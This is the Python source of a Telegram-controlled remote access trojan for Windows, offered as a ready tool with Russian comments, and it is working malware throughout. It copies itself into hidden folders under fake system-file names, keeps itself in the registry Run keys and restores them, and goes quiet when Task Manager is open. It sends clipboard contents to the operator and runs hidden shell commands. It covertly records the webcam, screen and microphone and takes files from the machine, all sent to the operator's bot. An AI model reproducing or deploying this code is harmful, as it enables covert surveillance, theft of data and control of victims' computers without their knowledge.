# =====================================================
# Project: Krosover Remote Tool v15.0 (Ultimate Edition)
# Developer: EdeNitca (Nikita Popov)
# Architecture & Optimization: AI on Google Search, powered by the Gemini family of models
# =====================================================
import telebot
from telebot import types
import os
import sys
import time
import random
import requests
import psutil
import threading
import shutil
import winreg
import subprocess
import pyperclip
import ctypes
import webbrowser
from datetime import datetime
from PIL import ImageGrab
import mouse
import pyttsx3
import GPUtil
import cv2
import numpy as np
from mss import mss
import sounddevice as sd
from scipy.io.wavfile import write
import wavio

# --- ТВОИ НАСТРОЙКИ ---
TOKEN = 'ВАШ_ТОКЕН_ИЗ_BOTFATHER'
MY_ID = 000000000 # ВАШ_ID_ИЗ_USERINFOBOT
HOME_DIR = os.getcwd()
bot = telebot.TeleBot(TOKEN)

# Запоминаем папку запуска
HOME_DIR = os.path.dirname(os.path.abspath(__file__))
import shutil
import winreg
import sys
import os

def anti_task_manager():
    global stream_active
    # Список программ, при которых боту лучше "затаиться"
    bad_procs = ["taskmgr.exe", "processhacker.exe", "perfmon.exe"]
    
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in bad_procs:
                    # Если открыт диспетчер - вырубаем активность
                    if stream_active:
                        stream_active = False
                        # Можно даже добавить небольшую паузу для бота
                        time.sleep(5) 
            except:
                pass
        time.sleep(2) # Проверяем каждые 2 секунды

def clipboard_logger():
    # ПРИ ЗАПУСКЕ: сразу запоминаем, что уже скопировано (чтобы не слать старое)
    try:
        last_text = pyperclip.paste() 
    except:
        last_text = ""
        
    print(">>> Логгер буфера запущен и игнорирует старый текст!") 
    
    while True:
        try:
            current_text = pyperclip.paste()
            # Теперь бот пришлет только то, что скопировано ПОСЛЕ запуска
            if current_text != last_text and current_text.strip():
                print(f"Обнаружен новый текст: {current_text[:30]}...") 
                last_text = current_text
                bot.send_message(MY_ID, f"🔔 Буфер: {last_text}")
        except Exception as e:
            print(f"Ошибка буфера: {e}")
        time.sleep(3)

def persistence_check():
    while True:
        try:
            # Просто вызываем autorun() раз в 10 минут
            # Если сосед что-то удалил в реестре, пока комп включен — бот это вернет
            autorun() 
        except:
            pass
        time.sleep(600)

# --- НАСТРОЙКА ИМЕНИ ---
FAKE_NAME = "CompPkgSrv.exe" # Как бот будет называться в системе

def autorun():
    if sys.argv[0].endswith('.py'):
        return

    # 1. Список ПАПОК, где бот будет прятаться
    target_dirs = [
        os.path.join(os.environ['USERPROFILE'], 'Documents', 'My Games', 'TheLongDrive'),
        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHelper'), # Папка SystemHelper
        os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'WinUpdateManager')        # Папка WinUpdateManager
    ]

    # 2. Список ИМЕН для самого EXE в каждой папке
    exe_names = [FAKE_NAME, "Helper.exe", "WinUpdate.exe"]

    # 3. Список ИМЕН для реестра
    reg_names = ["WindowsUpdateTask", "MicrosoftHelper", "WinTempManager"]

    # Путь к папке, откуда мы СЕЙЧАС запущены
    current_exe = os.path.abspath(sys.executable)
    current_folder = os.path.dirname(current_exe)

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        
        for i in range(len(target_dirs)):
            full_exe_path = os.path.join(target_dirs[i], exe_names[i])
            
            # Если папки еще нет — копируем ВСЁ содержимое нашей текущей папки туда
            if not os.path.exists(target_dirs[i]):
                # copytree копирует всю папку целиком со всеми DLL
                shutil.copytree(current_folder, target_dirs[i], dirs_exist_ok=True)
                
                # Переименовываем главный EXE в этой папке под новое имя (Helper.exe и т.д.)
                # Старое имя в новой папке — это то, как назывался наш файл изначально
                old_path_in_new_dir = os.path.join(target_dirs[i], os.path.basename(current_exe))
                if old_path_in_new_dir != full_exe_path:
                    os.rename(old_path_in_new_dir, full_exe_path)
                
                # Прячем всю папку (атрибут 6: системный + скрытый)
                ctypes.windll.kernel32.SetFileAttributesW(target_dirs[i], 6)

            # Прописываем в автозагрузку путь к EXE в этой папке
            winreg.SetValueEx(key, reg_names[i], 0, winreg.REG_SZ, full_exe_path)
            
        winreg.CloseKey(key)

        # ПЕРЕЕЗД: если мы запущены не из "элитных" мест — запускаем копию и выходим
        if current_folder.lower() not in [d.lower() for d in target_dirs]:
            os.startfile(os.path.join(target_dirs[0], exe_names[0]))
            os._exit(0)
            
    except Exception as e:
        print(f"Ошибка миграции: {e}")

# --- ИСПРАВЛЕННОЕ ПРИВЕТСТВИЕ ---
def send_hello():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        # Добавили магическую букву 'f' перед ковычками:
        msg = (f"🚀 **Система Remote Tool v15.0 ONLINE!**\n"
               f"🌐 IP: `{ip}`\n"
               f"👤 Юзер: `{os.getlogin()}`\n\n"
               f"📁 `/cd [путь]` — сменить папку\n"
               f"📂 `/ls` — список файлов\n"
               f"📥 `/get [путь]` — скачать файл\n"
               f"🚀 `/run [путь]` — запустить файл\n"
               f"💀 `/kill [имя.exe]` — убить процесс\n"
               f"🗑️ `/del` — [путь] — удалить файл\n"
               f"💻 `>` — > + команды терминала\n\n"
               f"📍 Текущая папка: `{os.getcwd()}`")
        bot.send_message(MY_ID, msg, reply_markup=main_menu(), parse_mode='Markdown')
    except: pass

def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    markup.add("📸 Скриншот", "📷 Вебка", "📜 Процессы")
    markup.add("🎯 Мышка-тролль", "ℹ️ Инфо", "🗣 Сказать фразу")
    markup.add("🌐 Открыть ссылку", "🎙Подслушать", "🎥 Запись 30с")  
    markup.add("🖼 Сменить обои", "🔴Выключение ПК", "⭕Перезагрузка ПК")
    markup.add("☢️Самоуничтожение", "🔄 Перезагрузить", "🛑Стоп") 
    return markup

# --- 🛑 КОМАНДА СТОП (ПЕРВОЙ ОЧЕРЕДЬЮ) ---
@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    if message.chat.id == MY_ID:
        bot.send_message(message.chat.id, "👋 Система Remote Tool 15.0 уходит в оффлайн. До связи!")
        print(">>> Бот выключен через Telegram.")
        time.sleep(1)
        os._exit(0)

# --- 🕹 ОСТАЛЬНЫЕ КОМАНДЫ ---

@bot.message_handler(commands=['del'])
def delete_file(message):
    if message.chat.id != MY_ID: return
    try:
        path = message.text.replace('/del ', '').replace('"', '').strip()
        if os.path.exists(path):
            os.remove(path)
            bot.send_message(message.chat.id, f"🗑 Файл удален: `{path}`", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❓ Файл не найден")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка удаления: {e}")

@bot.message_handler(func=lambda message: message.text.startswith(">"))
def hidden_terminal(message):
    if message.chat.id == MY_ID:
        # Убираем символ ">" и получаем саму команду
        command = message.text[1:].strip()
        
        try:
            # shell=True позволяет запускать встроенные команды типа dir, cd, echo
            # creationflags=0x08000000 скрывает черное окно консоли у соседа
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                stdin=subprocess.PIPE,
                text=True,
                creationflags=0x08000000 
            )
            
            # Получаем результат выполнения (текст из консоли)
            stdout, stderr = process.communicate(timeout=10)
            
            result = stdout if stdout else stderr
            if not result:
                result = "✅ Команда выполнена (без текста в ответ)."
                
            # Если ответ слишком длинный, Telegram его не пропустит (лимит 4096 символов)
            if len(result) > 4000:
                result = result[:4000] + "\n... (текст обрезан)"
                
            bot.send_message(MY_ID, f"💻 **Результат:**\n```\n{result}\n```", parse_mode="Markdown")
            
        except subprocess.TimeoutExpired:
            bot.send_message(MY_ID, "⏳ Ошибка: Команда выполнялась слишком долго.")
        except Exception as e:
            bot.send_message(MY_ID, f"❌ Ошибка терминала: {e}")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.chat.id == MY_ID:
        bot.send_message(message.chat.id, "🕹 Пульт ядерки активен!", reply_markup=main_menu())

@bot.message_handler(commands=['cd'])
def cd_cmd(message):
    if message.chat.id != MY_ID: return
    try:
        path = message.text.replace('/cd ', '').strip()
        if path == "~": path = os.path.expanduser("~")
        os.chdir(path)
        bot.send_message(message.chat.id, f"📍 Перешли в: {os.getcwd()}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

def send_webcam_photo(message):
    try:
        import cv2
        # Индекс 0 — основная камера. Если не сработает, бот напишет ошибку.
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) # CAP_DSHOW быстрее открывает на Windows
        
        # Даем камере 2 секунды "прогреться", чтобы автобаланс белого сработал
        time.sleep(2)
        
        success, frame = cap.read()
        if success:
            path = os.path.join(HOME_DIR, "shot.jpg")
            cv2.imwrite(path, frame)
            cap.release() # КРИТИЧНО: освобождаем камеру для других функций
            
            with open(path, "rb") as img:
                bot.send_photo(message.chat.id, img, caption="📸 Опа ну ты и красавчик сегодня!")
            os.remove(path)
        else:
            cap.release()
            bot.send_message(message.chat.id, "❌ Камера занята или не найдена.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка вебки: {e}")

def record_video(message):
    bot.send_message(message.chat.id, "🎬 Записываю экран + вебку (30 сек)...")
    file_path = "record.mp4"
    
    # Настройки: 8 кадров в секунду, размер файла 1280x720
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(file_path, fourcc, 8.0, (1280, 720)) 
    
    with mss() as sct:
        monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
        cap = cv2.VideoCapture(0) 
        
        start_time = time.time()
        while (time.time() - start_time) < 30:
            loop_start = time.time() # Фиксируем время начала кадра
            
            # 1. Захват экрана
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            
            # 2. РЕСАЙЗ экрана под размер видео (ОБЯЗАТЕЛЬНО)
            frame = cv2.resize(frame, (1280, 720))
            
            # 3. Наложение вебки
            success, web = cap.read()
            if success:
                web_small = cv2.resize(web, (250, 150)) # Вебка чуть поменьше
                h, w, _ = web_small.shape
                # Клеим в правый нижний угол (координаты под 1280x720)
                frame[720-h-20:720-20, 1280-w-20:1280-20] = web_small
                
            out.write(frame)
            
            # 4. СИНХРОНИЗАЦИЯ (чтобы 30 сек видео = 30 сек жизни)
            # Нам нужно 8 кадров в секунду (1 / 8 = 0.125 сек на кадр)
            elapsed = time.time() - loop_start
            if elapsed < 0.125:
                time.sleep(0.125 - elapsed)
            
        cap.release()
        out.release()

    # Отправка
    try:
        with open(file_path, "rb") as video:
            bot.send_video(message.chat.id, video, caption="✅ Видео с экрана и вебки готово!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка отправки: {e}")
    
    if os.path.exists(file_path):
        os.remove(file_path)

def set_wallpaper(message):
    try:
        if not message.photo:
            bot.send_message(message.chat.id, "❌ Это не фото! Попробуй еще раз через кнопку.")
            return

        # Берем самое качественное разрешение из присланных фото
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Путь, куда сохраним обои (лучше полный путь)
        image_path = os.path.join(os.environ['USERPROFILE'], 'wallpaper.jpg')
        
        with open(image_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        # МАГИЯ WINDOWS: меняем обои
        # SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        
        bot.send_message(message.chat.id, "✅ Обои успешно изменены! Пупсик❤️")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка при смене обоев: {e}")

def record_mic(message):
    # Внутренняя функция для потока
    def start_recording():
        try:
            fs = 44100
            duration = 30
            # Используем os.getcwd(), чтобы файл создался там, где бот сейчас (в TheLongDrive)
            path = "mic.wav"
            
            # Начинаем запись
            # channels=1 для обычных микрофонов, 2 если стерео
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
            sd.wait() # Ждем 30 секунд
            
            # Сохраняем в формате wav
            wavio.write(path, recording, fs, sampwidth=2)
            
            # Отправляем как ГОЛОСОВОЕ сообщение (так удобнее слушать в ТГ)
            with open(path, 'rb') as f:
                bot.send_voice(message.chat.id, f, caption="🎙 Запись с микрофона (30 сек)") 
            
            # Чистим за собой
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка микро: {e}")

    # Запускаем запись в отдельном потоке, чтобы бот не "замерз" на 30 секунд
    threading.Thread(target=start_recording, daemon=True).start()
    bot.send_message(message.chat.id, "🎤 Микрофон включен на 30 секунд. Жди файл...")

# --- ФУНКЦИЯ ОТКРЫТИЯ ССЫЛКИ ---
def process_open_url(message):
    try:
        import webbrowser
        url = message.text.strip()
        if not url.startswith('http'): url = 'http://' + url
        webbrowser.open(url)
        bot.send_message(message.chat.id, f"✅ Открыл: {url}", reply_markup=main_menu())
    except:
        bot.send_message(message.chat.id, "❌ Ошибка ссылки", reply_markup=main_menu())

@bot.message_handler(commands=['ls'])
def ls_cmd(message):
    if message.chat.id != MY_ID: return
    try:
        path = message.text.replace('/ls', '').strip() or "."
        files = os.listdir(path)
        list_text = "\n".join([f"- {f}" for f in files[:40]])
        bot.send_message(message.chat.id, f"📂 Папка: {os.path.abspath(path)}\n\n{list_text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['get'])
def get_cmd(message):
    if message.chat.id != MY_ID: return
    try:
        path = message.text.replace('/get ', '').replace('"', '').strip()
        with open(path, 'rb') as f:
            bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['run'])
def run_cmd(message):
    if message.chat.id != MY_ID: return
    try:
        path = message.text.replace('/run ', '').replace('"', '').strip()
        os.startfile(path)
        bot.send_message(message.chat.id, f"🚀 Запуск: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['kill'])
def kill_cmd(message):
    if message.chat.id != MY_ID: return
    target = message.text.replace('/kill ', '').strip()
    os.system(f"taskkill /F /IM {target} /T")
    bot.send_message(message.chat.id, f"✅ Сигнал для {target} отправлен")

# --- 🖱 ОБРАБОТКА КНОПОК И ТЕКСТА ---

@bot.message_handler(content_types=['text'])
def handle_text(message):
    global stream_active  
    global stream_url
    if message.chat.id != MY_ID: return

    if message.text == "📸 Скриншот":
        try:
            p = os.path.join(HOME_DIR, "s.png")
            ImageGrab.grab().save(p)
            with open(p, "rb") as img: bot.send_photo(message.chat.id, img)
            os.remove(p)
        except: bot.send_message(message.chat.id, "❌ Ошибка скрина")

    elif message.text == "📷 Вебка":
        send_webcam_photo(message)

    elif message.text == "📜 Процессы":
        procs = []
        ignore = ['system idle process', 'system', 'registry', 'smss.exe', 'svchost.exe', 'services.exe']
        for proc in psutil.process_iter(['name']):
            name = proc.info['name']
            if name.lower() not in ignore and name not in procs:
                procs.append(name)
        procs.sort()
        msg = "📋 Программы:\n\n" + "\n".join([f"🔹 {p}" for p in procs[:40]])
        bot.send_message(message.chat.id, msg)

    elif message.text == "🎥 Запись 30с":
        # Запускаем в отдельном потоке, чтобы бот не "завис" во время записи
        threading.Thread(target=record_video, args=(message,)).start()

    elif message.text == "🛑Стоп":
        stop_cmd(message)

    elif message.text == "🖼 Сменить обои":
        msg = bot.send_message(message.chat.id, "📸 Пришли мне картинку пупсик")
        bot.register_next_step_handler(msg, set_wallpaper)

    elif message.text == "🎙Подслушать":
        record_mic(message) 

    elif message.text == "🌐 Открыть ссылку":
        msg = bot.send_message(message.chat.id, "🔗 Пришли ссылку:")
        bot.register_next_step_handler(msg, process_open_url)

    elif message.text == "🔄 Перезагрузить бота":
        if message.chat.id == MY_ID:
            bot.send_message(message.chat.id, "🚀 Перезапускаю систему... Скоро буду в сети!")
        
        try:
            # 1. Получаем путь к текущему запущенному EXE
            current_exe = os.path.abspath(sys.executable)
            
            # 2. Запускаем новую копию процесса
            os.startfile(current_exe)
            
            # 3. Мгновенно убиваем текущий процесс
            os._exit(0)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка перезагрузки: {e}")

    elif message.text == "ℹ️ Инфо":
        try:
            import GPUtil
            # 1. Честный замер CPU (ждем 1 секунду)
            cpu = psutil.cpu_percent(interval=1) 
            ram = psutil.virtual_memory().percent
            
            # 2. Видеокарта (GPU)
            gpus = GPUtil.getGPUs()
            gpu_info = "❌ Не найдена"
            if gpus:
                g = gpus[0]
                gpu_info = f"{int(g.load*100)}% ({int(g.temperature)}°C)"
            
            # 3. Поиск всех дисков (C, D, флешки)
            disk_report = ""
            for p in psutil.disk_partitions():
                try:
                    if 'cdrom' in p.opts or p.fstype == "": continue
                    d_usage = psutil.disk_usage(p.mountpoint)
                    free = d_usage.free // (1024**3)
                    total = d_usage.total // (1024**3)
                    disk_report += f"💿 {p.mountpoint} `{free} / {total} GB` свободно\n"
                except: continue

            # 4. Время работы
            uptime = int((time.time() - psutil.boot_time()) // 60)
            up_h, up_m = divmod(uptime, 60)

            msg = (f"📊 **МОНИТОРИНГ v15.0:**\n"
                   f"🔹 CPU: `{cpu}%` | RAM: `{ram}%` \n"
                   f"🔹 GPU: `{gpu_info}`\n"
                   f"{disk_report}"
                   f"🔹 Uptime: `{up_h}ч {up_m}мин` \n"
                   f"📍 `{os.getcwd()}`")
            
            bot.send_message(message.chat.id, msg, parse_mode='Markdown')
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка инфо: {e}")

    elif message.text == "🎯 Мышка-тролль":
        try:
            x, y = mouse.get_position()
            mouse.move(x + random.randint(-400, 400), y + random.randint(-400, 400))
            bot.send_message(message.chat.id, "🎯 Мышка дёрнулась!")
        except:
            bot.send_message(message.chat.id, "❌ Ошибка мышки")
    elif message.text == "🔴Выключение ПК":
        if message.chat.id == MY_ID:
            bot.send_message(message.chat.id, "🔌 Выключаю компьютер... До связи!")
            os.system("shutdown /s /t 1")

    elif message.text == "⭕Перезагрузка ПК":
        if message.chat.id == MY_ID:
            bot.send_message(message.chat.id, "🔄 Перезагружаю систему...")
            os.system("shutdown /r /t 1")

    elif message.text == "🗣 Сказать фразу":
        msg = bot.send_message(message.chat.id, "🎤 Напиши сообщение, и я его озвучу:")
        # Эта магия заставляет бота "ждать" следующее сообщение именно для этой функции
        bot.register_next_step_handler(msg, process_say_step)

    elif message.text == "☢️Самоуничтожение":
        if message.chat.id == MY_ID:
            bot.send_message(message.chat.id, "💣 Запускаю ПОЛНЫЙ протокол самоуничтожения... Чищу все копии и реестр. Прощай!")
        
        # 1. Список всех путей и ключей из твоего autorun
        targets = [
            os.path.join(os.environ['USERPROFILE'], 'Documents', 'My Games', 'TheLongDrive'),
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHelper'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'WinUpdateManager')
        ]
        reg_names = ["WindowsUpdateTask", "MicrosoftHelper", "WinTempManager"]
        
        try:
            # 2. Чистим реестр (все три ключа)
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
            for reg_name in reg_names:
                try:
                    winreg.DeleteValue(key, reg_name)
                except: pass # Если ключа уже нет, просто идем дальше
            winreg.CloseKey(key)
            
            # 3. Создаем универсальный батник для сноса всех папок
            bat_path = os.path.join(os.environ['TEMP'], 'final_cleanup.bat')
            with open(bat_path, "w", encoding="cp866") as f: # Кодировка для кириллицы в путях
                f.write('@echo off\n')
                f.write('timeout /t 5 /nobreak > nul\n') # Ждем 5 сек, чтобы все процессы закрылись
                for folder in targets:
                    f.write(f'rd /s /q "{folder}"\n') # Удаляем каждую из 3-х папок
                f.write(f'del "%~f0"\n') # Батник удаляет сам себя в конце
            
            # Запускаем батник
            os.startfile(bat_path)
            
            # 4. Мгновенный выход
            os._exit(0)
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Критическая ошибка при зачистке: {e}")

    # Ссылки
    elif message.text.startswith('http'):
        try:
            url = message.text.strip()
            name = url.split('/')[-1] or "file"
            r = requests.get(url, stream=True, timeout=15)
            with open(name, 'wb') as f:
                for chunk in r.iter_content(8192): f.write(chunk)
            bot.send_message(message.chat.id, f"✅ Скачано в: {os.path.abspath(name)}")
        except:
            bot.send_message(message.chat.id, "❌ Ошибка загрузки")

def process_say_step(message):
    try:
        if message.chat.id != MY_ID: return
        text = message.text
        
        # Если нажали кнопку вместо ввода текста — возвращаем меню
        if text in ["📸 Скриншот", "📷 Вебка", "📜 Процессы", "ℹ️ Инфо", "🗣 Сказать фразу", "🔴Выключение ПК", "⭕Перезагрузка ПК"]:
            bot.send_message(message.chat.id, "🕹 Возврат в меню", reply_markup=main_menu())
            return

        import pyttsx3
        engine = pyttsx3.init()
        voices = engine.getProperty('voices')
        
        target_voice = None
        # Проверка на русский язык
        is_ru = any('а' <= char.lower() <= 'я' for char in text)

        if is_ru:
            # Ищем Ирину (Irina)
            for v in voices:
                if "Irina" in v.name or "Russian" in v.name:
                    target_voice = v.id
                    break
        else:
            # Ищем Дэвида (David)
            for v in voices:
                if "David" in v.name or "English" in v.name:
                    target_voice = v.id
                    break

        if target_voice:
            engine.setProperty('voice', target_voice)
        
        engine.setProperty('rate', 160)
        engine.say(text)
        engine.runAndWait()
        engine.stop()
        
        # Подтверждаем и ВОЗВРАЩАЕМ МЕНЮ
        bot.send_message(message.chat.id, f"📢 Виндоус промурлыкал: {text}", reply_markup=main_menu())
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}", reply_markup=main_menu())

if __name__ == '__main__':
    autorun()
    os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])))
    threading.Thread(target=anti_task_manager, daemon=True).start()
    threading.Thread(target=clipboard_logger, daemon=True).start()
    threading.Thread(target=persistence_check, daemon=True).start()
    print(">>> Krosover Remote Tool v15.0 (Ultimate) запущен!") 
    send_hello()
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except:
            time.sleep(5)
